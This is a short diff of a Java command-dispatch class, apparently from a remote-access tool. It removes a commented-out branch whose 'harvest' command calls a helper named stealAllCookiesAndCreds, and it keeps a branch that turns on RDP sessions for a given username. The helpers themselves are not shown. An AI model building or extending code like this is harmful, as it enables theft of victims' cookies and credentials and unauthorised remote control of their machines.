@@ -74,30 +74,7 @@ public class CommandMacroManager {
 				return true;
 			}
 		}
-		/*
-		if(commandString.equals(DELETE_COOKIES_CMD)) {
-			MacroOutcome outcome = CookiesCommandHelper.clearAllCookies(io, sessionId);
-			if(outcome.hasErrors()) {
-				io.sendIO(sessionId, "Cannot execute, errors encountered: " + System.lineSeparator());
-				for(String error : outcome.getErrors()) {
-					io.sendIO(sessionId, error + System.lineSeparator());
-				}
-			}
-			for(String msg : outcome.getOutput()) {
-				io.sendIO(sessionId, msg + System.lineSeparator());
-			}
-		}else if(commandString.equals(HARVEST_COOKIES_CMD)) {
-			MacroOutcome outcome = CookiesCommandHelper.stealAllCookiesAndCreds(io, sessionId, harvestProcessor);
-			if(outcome.hasErrors()) {
-				io.sendIO(sessionId, "Cannot execute, errors encountered: " + System.lineSeparator());
-				for(String error : outcome.getErrors()) {
-					io.sendIO(sessionId, error + System.lineSeparator());
-				}
-			}
-			for(String msg : outcome.getOutput()) {
-				io.sendIO(sessionId, msg + System.lineSeparator());
-			}
-		}else*/ if(commandString.startsWith(ACTIVATE_RDP_CMD)){
+		if(commandString.startsWith(ACTIVATE_RDP_CMD)){
 			String username = commandString.substring(ACTIVATE_RDP_CMD.length() + 1);
 			RDPSessionInfo info = manager.executeRDPSetup(sessionStr, username);
 			if(info.hasErrors()) {
